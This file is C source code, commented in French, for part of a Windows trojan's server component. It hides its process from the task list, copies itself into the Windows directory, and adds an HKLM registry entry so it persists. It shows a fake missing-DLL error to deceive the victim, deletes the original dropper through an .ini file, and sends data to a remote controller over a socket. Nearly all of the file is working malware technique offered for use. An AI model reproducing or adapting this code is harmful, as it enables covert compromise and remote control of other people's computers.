
//----------------------------------------------------------
// LES PROTOTYPES:
//----------------------------------------------------------

int troyan(void);
int sendok(void);
int setup(void);
int clean(void);
BOOL RegisterServiceProcess( DWORD p1, DWORD p2 );
LRESULT CALLBACK DlgProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);

//----------------------------------------------------------
// CACHER DE WINDOWS:
//----------------------------------------------------------

BOOL RegisterServiceProcess( DWORD p1, DWORD p2 )
{
    typedef DWORD (WINAPI *PREGISTERSERVICEPROCESS)(DWORD,DWORD);

    PREGISTERSERVICEPROCESS  rsp;
    CHAR        K32Path[ MAX_PATH ];
    HINSTANCE   hK32;
    BOOL        Rc;

    Rc = FALSE;
    GetSystemDirectory( K32Path, MAX_PATH );
    strcat( K32Path, "\\kernel32.dll" );
    hK32 = LoadLibrary( K32Path );
    if( hK32 != NULL ) {
      rsp = (PREGISTERSERVICEPROCESS) GetProcAddress( hK32, "RegisterServiceProcess" );
      if( rsp != NULL ) {
        Rc = TRUE;
        rsp( p1, p2 );
      }
      FreeLibrary( hK32 );
    }
    return Rc;
  }

//----------------------------------------------------------
// RENVOYER OK
//----------------------------------------------------------

int sendok(void)
{
	send(sok,bon,sizeof(bon),0);
	return(0);
}

//----------------------------------------------------------
// INSTALLER LE TROYAN
//----------------------------------------------------------


int setup(void)
{
	DWORD Nbdebytes;
	HANDLE Handle;
	char filename[]="C:\\WINDOWS\\SERVER.INI";

	CopyFile(dir,thedir,FALSE); //on copie le fichier et on overwrite

	//un petit tour de la base de registre:)
	RegCreateKeyEx(HKEY_LOCAL_MACHINE,reg,NULL,NULL,NULL,KEY_ALL_ACCESS,NULL,&zehandle,&zeresult);
	RegSetValueEx(zehandle,namereg,NULL,REG_SZ,(LPBYTE)thedir,sizeof(thedir));

	//la petite boite de message qui dit qu'il manque une dll.
	MessageBox(NULL,caption,erreur,MB_ICONEXCLAMATION);

	//la partie chaude : effacer le server par l'interm�diaire
	//d'un fichier .ini.
	Handle = CreateFile(filename, GENERIC_READ+GENERIC_WRITE,NULL,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL,NULL);
	WriteFile(Handle,dir,sizeof(dir),&Nbdebytes,NULL);
	CloseHandle(Handle);

	ShellExecute(NULL,"open",thedir,NULL,NULL,SW_SHOWNORMAL);

	ExitProcess(0); //on laisse la main server copi� dans windows.

	return (0);
}

//----------------------------------------------------------
// LA BOITE DE DIALOGUE "DIS MOI KKCHOSE"
//----------------------------------------------------------

LRESULT CALLBACK DlgProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)  
{
	switch(msg)
	{
	case WM_COMMAND: 
		{                                                       
			switch(LOWORD(wParam))
			{

				case IDC_OK:
					{
						GetDlgItemText(hwnd,IDC_TXT,dixit,100);
						send(sok,dixit,sizeof(dixit),0);
						EndDialog(hwnd, FALSE);
						break;
					}

			}
			break;
		}


	case WM_CTLCOLOREDIT:
		{
			hdc = (HDC) wParam;
			SetBkColor(hdc,macolor);
			SetTextColor(hdc,blanc);
			return (long) CreateSolidBrush(macolor);
		}

	case WM_CTLCOLORDLG:
		{
			return (long) CreateSolidBrush(noir);
		}

		default: 	
		return FALSE;
     }
     return TRUE; 
}

//----------------------------------------------------------
// EFFACER LE SERVER D'ORIGINE
//----------------------------------------------------------

int clean(void)
{
	char filename[]="C:\\WINDOWS\\SERVER.INI";
	char servername[150];
	int n = 0;

	FILE *file = NULL;
	file=fopen(filename,"rb");

	if (!file)    //si le fichier n'existe pas on part
		return(0);

boucle:
	servername[n] = getc(file);
	if (servername[n] != 0)
	{
		n++;
		goto boucle;
	}

	fclose(file);
	DeleteFile(filename);
	DeleteFile(servername);

	return(1);
}